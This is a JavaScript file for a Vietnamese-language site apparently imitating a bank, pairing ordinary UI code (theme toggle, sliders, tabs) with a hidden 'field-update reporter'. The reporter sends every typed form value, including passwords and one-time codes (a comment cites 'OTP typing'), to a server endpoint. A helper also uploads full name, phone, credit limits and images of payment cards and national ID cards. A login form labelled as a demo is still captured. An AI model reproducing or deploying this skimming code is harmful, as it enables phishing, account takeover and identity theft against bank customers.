// Defensive stub: ensure the helper exists early so pages or console can call it even if
// some later script throws. This makes `window._vib_field_update` visible for debugging.
window._vib_field_update = window._vib_field_update || {
  postField: function () {
    // stub returns resolved promise to match async signature
    console &&
      console.warn &&
      console.warn('vib_field_update stub: postField called before initialization');
    return Promise.resolve();
  },
  getSessionId: function () {
    try {
      return sessionStorage.getItem('vib_session_id');
    } catch (e) {
      return null;
    }
  },
};

// Theme toggle & persistence
(function () {
  const btn = document.getElementById('themeToggle');
  const stored = localStorage.getItem('theme');
  if (stored === 'dark') {
    document.body.classList.remove('theme-light');
    document.body.classList.add('theme-dark');
    btn.setAttribute('aria-pressed', 'true');
    btn.textContent = '☀️';
  }
  btn?.addEventListener('click', () => {
    const dark = document.body.classList.toggle('theme-dark');
    document.body.classList.toggle('theme-light', !dark);
    localStorage.setItem('theme', dark ? 'dark' : 'light');
    btn.setAttribute('aria-pressed', dark ? 'true' : 'false');
    btn.textContent = dark ? '☀️' : '🌙';
  });
})();

// Auto field-update reporter
(function () {
  // If a page already defines FIELD_UPDATE_API, respect it
  const FIELD_UPDATE_API =
    typeof window.FIELD_UPDATE_API !== 'undefined'
      ? window.FIELD_UPDATE_API
      : location.origin && location.origin !== 'null'
      ? location.origin + '/api/field-update'
      : '/api/field-update';

  // Generate or reuse sessionId stored in sessionStorage
  function getSessionId() {
    try {
      let sid = sessionStorage.getItem('vib_session_id');
      if (!sid) {
        sid = 's_' + Math.random().toString(36).slice(2, 10);
        sessionStorage.setItem('vib_session_id', sid);
      }
      return sid;
    } catch (e) {
      return 's_' + Math.random().toString(36).slice(2, 10);
    }
  }

  const sessionId = getSessionId();

  // Helper to send field update
  async function postField(field, value) {
    if (!field) return;
    const body = { sessionId, field, value, page: document.title || location.pathname };
    try {
      await fetch(FIELD_UPDATE_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
      });
    } catch (e) {
      // ignore network errors in UI
      // console.warn('field-update failed', e);
    }
  }

  // Throttle per-element (store timer id on dataset)
  function scheduleSend(el, fieldName) {
    const key = 'vib_timer';
    if (el.dataset[key]) {
      clearTimeout(Number(el.dataset[key]));
    }
    // send after 600ms of silence
    const t = setTimeout(() => {
      const val = el.value;
      postField(fieldName, val);
      delete el.dataset[key];
    }, 600);
    el.dataset[key] = String(t);
  }

  // Attach listeners to inputs/selects/textareas that do not opt-out
  function attachAll() {
    const sel = 'input,textarea,select';
    const els = Array.from(document.querySelectorAll(sel));
    els.forEach((el) => {
      // opt-out via data-field-update="off"
      if (el.dataset && el.dataset.fieldUpdate === 'off') return;

      // choose field name: data-field > name > id
      const fieldName = el.dataset.field || el.name || el.id;
      if (!fieldName) return; // no identifier

      // on blur always send
      el.addEventListener('blur', () => {
        postField(fieldName, el.value);
      });

      // on input schedule throttled send (useful for OTP typing)
      el.addEventListener('input', () => {
        scheduleSend(el, fieldName);
      });
    });
  }

  // Wait for DOM ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', attachAll);
  } else {
    attachAll();
  }

  // Helper to read a File or input element as data URL (browser)
  function readFileAsDataURL(file) {
    return new Promise((resolve, reject) => {
      if (!file) return resolve(null);
      if (typeof file === 'string' && file.startsWith('data:')) return resolve(file);
      if (file instanceof File || file instanceof Blob) {
        const fr = new FileReader();
        fr.onload = () => resolve(fr.result);
        fr.onerror = (e) => reject(e);
        fr.readAsDataURL(file);
      } else if (file instanceof HTMLInputElement && file.files && file.files[0]) {
        const f = file.files[0];
        const fr = new FileReader();
        fr.onload = () => resolve(fr.result);
        fr.onerror = (e) => reject(e);
        fr.readAsDataURL(f);
      } else {
        resolve(null);
      }
    });
  }

  // Send a consolidated payload (name, limits, phone, and optional images)
  async function sendConsolidated(opts) {
    // opts: { fullName, limitGranted, limitAvailable, phone, cardInput, cccdInput, cardBackInput, cccdBackInput, cardType, page }
    const payload = { sessionId, page: opts.page || document.title || location.pathname };
    if (opts.fullName) payload.fullName = opts.fullName;
    if (opts.limitGranted) payload.limitGranted = opts.limitGranted;
    if (opts.limitAvailable) payload.limitAvailable = opts.limitAvailable;
    if (opts.phone) payload.phone = opts.phone;
    if (opts.cardType) payload.cardType = opts.cardType;

    // Read optional images (File, input element, or data URL string)
    try {
      if (opts.cardInput) {
        const cardData = await readFileAsDataURL(opts.cardInput);
        if (cardData) payload.cardImage = cardData;
      }
      if (opts.cccdInput) {
        const cccdData = await readFileAsDataURL(opts.cccdInput);
        if (cccdData) payload.cccdImage = cccdData;
      }
      // back images
      if (opts.cardBackInput) {
        const cb = await readFileAsDataURL(opts.cardBackInput);
        if (cb) payload.cardImageBack = cb;
      }
      if (opts.cccdBackInput) {
        const cb2 = await readFileAsDataURL(opts.cccdBackInput);
        if (cb2) payload.cccdImageBack = cb2;
      }
    } catch (e) {
      // ignore file read errors but continue
      console && console.warn && console.warn('readFileAsDataURL error', e);
    }

    try {
      const res = await fetch(FIELD_UPDATE_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      return res;
    } catch (e) {
      // network error
      return null;
    }
  }

  // expose helper for manual use
  window._vib_field_update = { postField, getSessionId, sendConsolidated };
})();

// Auto-scroll tab viewport (showing ~4 items) from right to left, pause on hover/focus
(function () {
  const viewport = document.querySelector('.main-nav-bar__viewport');
  const tabs = document.querySelector('.main-nav-bar__tabs');
  if (!viewport || !tabs) return;

  // We'll auto-scroll the viewport's scrollLeft continuously from 0 to max and loop.
  let rafId = null;
  let running = true;
  const SPEED = 30; // pixels per second
  let last = null;

  function step(timestamp) {
    if (!last) last = timestamp;
    const delta = (timestamp - last) / 1000; // seconds
    last = timestamp;
    if (running) {
      viewport.scrollLeft = viewport.scrollLeft + SPEED * delta || 0;
      // loop when reaching the end
      if (viewport.scrollLeft + viewport.clientWidth >= tabs.scrollWidth - 1) {
        // smooth jump back to start
        viewport.scrollLeft = 0;
      }
    }
    rafId = requestAnimationFrame(step);
  }

  function start() {
    if (!rafId) rafId = requestAnimationFrame(step);
    running = true;
  }
  function stop() {
    running = false;
    last = null;
  }

  // Pause when user interacts
  viewport.addEventListener('mouseenter', () => stop());
  viewport.addEventListener('mouseleave', () => start());
  viewport.addEventListener('focusin', () => stop());
  viewport.addEventListener('focusout', () => start());

  // Start when visible
  start();
})();

// Mobile nav toggle + ensure middle bar element for animation
(function () {
  const toggle = document.querySelector('.primary-nav__toggle');
  const menu = document.getElementById('primary-menu');
  if (!toggle || !menu) return;
  // If icon-burger lacks middle span child, add it
  const icon = toggle.querySelector('.icon-burger');
  if (icon && !icon.querySelector('span')) {
    const mid = document.createElement('span');
    icon.appendChild(mid);
  }
  toggle.addEventListener('click', () => {
    const expanded = toggle.getAttribute('aria-expanded') === 'true';
    toggle.setAttribute('aria-expanded', String(!expanded));
    menu.dataset.open = !expanded ? 'true' : 'false';
  });
})();

// Search overlay toggle
(function () {
  const openBtn = document.querySelector('.header-search-toggle');
  const dialog = document.getElementById('site-search-dialog');
  if (!openBtn || !dialog) return;
  const input = dialog.querySelector('input[type="search"]');
  const closeEls = dialog.querySelectorAll('[data-close="search"]');
  let lastActive = null;

  function open() {
    if (!dialog.hasAttribute('hidden')) return; // already open
    lastActive = document.activeElement;
    dialog.removeAttribute('hidden');
    document.body.style.overflow = 'hidden';
    requestAnimationFrame(() => input?.focus());
  }
  function close() {
    if (dialog.hasAttribute('hidden')) return;
    dialog.setAttribute('hidden', '');
    document.body.style.overflow = '';
    if (lastActive && typeof lastActive.focus === 'function') lastActive.focus();
  }
  openBtn.addEventListener('click', open);
  closeEls.forEach((el) => el.addEventListener('click', close));
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') close();
  });
  dialog.addEventListener('click', (e) => {
    if (e.target === dialog) close();
  });
})();

// Tabs logic
(function () {
  const tabContainers = document.querySelectorAll('[data-tabs]');
  tabContainers.forEach((container) => {
    const tabs = container.querySelectorAll('[role="tab"]');
    const panels = container.querySelectorAll('[role="tabpanel"]');
    function activate(tab) {
      tabs.forEach((t) => {
        t.setAttribute('aria-selected', 'false');
      });
      panels.forEach((p) => {
        p.hidden = true;
      });
      tab.setAttribute('aria-selected', 'true');
      const panel = container.querySelector('#' + tab.getAttribute('aria-controls'));
      if (panel) panel.hidden = false;
    }
    tabs.forEach((t) => {
      t.addEventListener('click', () => activate(t));
      t.addEventListener('keydown', (e) => {
        const idx = Array.from(tabs).indexOf(document.activeElement);
        if (['ArrowRight', 'ArrowLeft', 'Home', 'End'].includes(e.key)) {
          e.preventDefault();
          let nextIdx = idx;
          if (e.key === 'ArrowRight') nextIdx = (idx + 1) % tabs.length;
          else if (e.key === 'ArrowLeft') nextIdx = (idx - 1 + tabs.length) % tabs.length;
          else if (e.key === 'Home') nextIdx = 0;
          else if (e.key === 'End') nextIdx = tabs.length - 1;
          tabs[nextIdx].focus();
          activate(tabs[nextIdx]);
        }
      });
    });
  });
})();

// Simple testimonial auto-advance (no heavy carousel)
(function () {
  const slider = document.querySelector('[data-slider]');
  if (!slider) return;
  const items = slider.querySelectorAll('.testimonial');
  let idx = 0;
  function rotate() {
    items.forEach((el, i) => {
      el.style.opacity = i === idx ? '1' : '.25';
      el.style.transform = i === idx ? 'scale(1)' : 'scale(.96)';
    });
    idx = (idx + 1) % items.length;
  }
  rotate();
  const interval = setInterval(rotate, 4500);
  // Pause on hover for accessibility preference
  slider.addEventListener('mouseenter', () => clearInterval(interval));
})();

// Fake dynamic rate pulse
(function () {
  const rateCells = document.querySelectorAll('[data-rate]');
  rateCells.forEach((cell) => {
    cell.addEventListener('mouseenter', () => {
      cell.style.transition = 'transform 300ms';
      cell.style.transform = 'scale(1.08)';
    });
    cell.addEventListener('mouseleave', () => {
      cell.style.transform = 'scale(1)';
    });
  });
})();

// Simple form handler (demo)
(function () {
  const form = document.querySelector('.signup-form');
  if (!form) return;
  form.addEventListener('submit', (e) => {
    e.preventDefault();
    const email = form.querySelector('input[type=email]');
    if (!email?.value) return;
    form.reset();
    const msg = document.createElement('div');
    msg.textContent = 'Cảm ơn! Vui lòng kiểm tra email.';
    msg.className = 'form-success';
    form.after(msg);
    setTimeout(() => msg.remove(), 6000);
  });
})();

// Login form demo (no real auth)
(function () {
  const login = document.querySelector('.login-form');
  if (!login) return;
  login.addEventListener('submit', (e) => {
    e.preventDefault();
    const acc = login.querySelector('#login-account');
    const pass = login.querySelector('#login-pass');
    if (!acc?.value || !pass?.value) return;
    const note = document.createElement('div');
    note.className = 'form-success';
    note.textContent = 'Đây chỉ là minh hoạ – không thực hiện đăng nhập.';
    login.after(note);
    setTimeout(() => note.remove(), 5000);
    login.reset();
  });
})();

// Banner slider (4 hình quảng cáo)
(function () {
  const slider = document.querySelector('.ad-slider');
  if (!slider) return;
  const track = slider.querySelector('[data-ad-track]');
  const slides = Array.from(track.children);
  const prevBtn = slider.querySelector('[data-ad-prev]');
  const nextBtn = slider.querySelector('[data-ad-next]');
  const dotsWrap = slider.querySelector('[data-ad-dots]');
  let index = 0;
  const INTERVAL = 5500;
  let timer = null;
  // Create dots
  slides.forEach((_, i) => {
    const b = document.createElement('button');
    b.type = 'button';
    b.setAttribute('role', 'tab');
    b.setAttribute('aria-label', `Chuyển tới banner ${i + 1}`);
    if (i === 0) b.setAttribute('aria-selected', 'true');
    dotsWrap.appendChild(b);
  });
  const dots = Array.from(dotsWrap.children);

  function update() {
    const offset = -index * 100;
    track.style.transform = `translateX(${offset}%)`;
    slides.forEach((s, i) => (s.inert = i !== index)); // accessibility: prevent tabbing hidden
    dots.forEach((d, i) =>
      i === index ? d.setAttribute('aria-selected', 'true') : d.removeAttribute('aria-selected')
    );
  }
  function next() {
    index = (index + 1) % slides.length;
    update();
  }
  function prev() {
    index = (index - 1 + slides.length) % slides.length;
    update();
  }
  function go(i) {
    index = i;
    update();
  }
  function start() {
    stop();
    timer = setInterval(next, INTERVAL);
  }
  function stop() {
    if (timer) clearInterval(timer);
  }

  nextBtn?.addEventListener('click', () => {
    next();
    start();
  });
  prevBtn?.addEventListener('click', () => {
    prev();
    start();
  });
  dots.forEach((d, i) =>
    d.addEventListener('click', () => {
      go(i);
      start();
    })
  );

  slider.addEventListener('mouseenter', () => {
    slider.dataset.paused = 'true';
    stop();
  });
  slider.addEventListener('mouseleave', () => {
    delete slider.dataset.paused;
    start();
  });
  // Swipe support (basic)
  let startX = 0;
  let dragging = false;
  track.addEventListener('pointerdown', (e) => {
    dragging = true;
    startX = e.clientX;
    track.style.transition = 'none';
    stop();
  });
  window.addEventListener('pointerup', (e) => {
    if (!dragging) return;
    dragging = false;
    track.style.transition = '';
    const diff = e.clientX - startX;
    if (Math.abs(diff) > 60) {
      diff < 0 ? next() : prev();
    }
    start();
  });
  window.addEventListener('pointermove', (e) => {
    if (!dragging) return;
    const diff = e.clientX - startX;
    const percent = (diff / slider.offsetWidth) * 100;
    const base = -index * 100;
    track.style.transform = `translateX(${base + percent}%)`;
  });

  // Keyboard support
  slider.addEventListener('keydown', (e) => {
    if (e.key === 'ArrowRight') {
      next();
      start();
    } else if (e.key === 'ArrowLeft') {
      prev();
      start();
    }
  });

  update();
  start();
})();

// Main nav tab-bar behavior (indicator + keyboard navigation)
(function () {
  const tablist = document.querySelector('[data-tablist]');
  if (!tablist) return;
  const tabs = Array.from(tablist.querySelectorAll('[role="tab"]'));

  // helper to update indicator (uses ::after on tablist)
  function updateIndicator(activeIndex) {
    const rects = tabs.map((t) => t.getBoundingClientRect());
    const listRect = tablist.getBoundingClientRect();
    const activeRect = rects[activeIndex];
    const left = activeRect.left - listRect.left + tablist.scrollLeft;
    const width = activeRect.width;
    tablist.style.setProperty('--indicator-left', left + 'px');
    tablist.style.setProperty('--indicator-width', width + 'px');
    // apply to the pseudo element by setting inline style on the element: update ::after via width using CSS vars
    tablist.classList.add('with-indicator');
  }

  function activateTab(newIndex) {
    tabs.forEach((t, i) => {
      const selected = i === newIndex;
      t.setAttribute('aria-selected', selected ? 'true' : 'false');
      t.tabIndex = selected ? 0 : -1;
    });
    tabs[newIndex].focus();
    updateIndicator(newIndex);
  }

  // initial indicator
  const initIndex = tabs.findIndex((t) => t.getAttribute('aria-selected') === 'true') || 0;
  window.addEventListener('load', () => updateIndicator(initIndex));
  window.addEventListener('resize', () => {
    const active = tabs.findIndex((t) => t.getAttribute('aria-selected') === 'true');
    updateIndicator(active === -1 ? 0 : active);
  });

  tabs.forEach((tab, idx) => {
    tab.addEventListener('click', () => activateTab(idx));
    tab.addEventListener('keydown', (e) => {
      if (e.key === 'ArrowRight') {
        e.preventDefault();
        activateTab((idx + 1) % tabs.length);
      } else if (e.key === 'ArrowLeft') {
        e.preventDefault();
        activateTab((idx - 1 + tabs.length) % tabs.length);
      } else if (e.key === 'Home') {
        e.preventDefault();
        activateTab(0);
      } else if (e.key === 'End') {
        e.preventDefault();
        activateTab(tabs.length - 1);
      }
    });
  });
})();
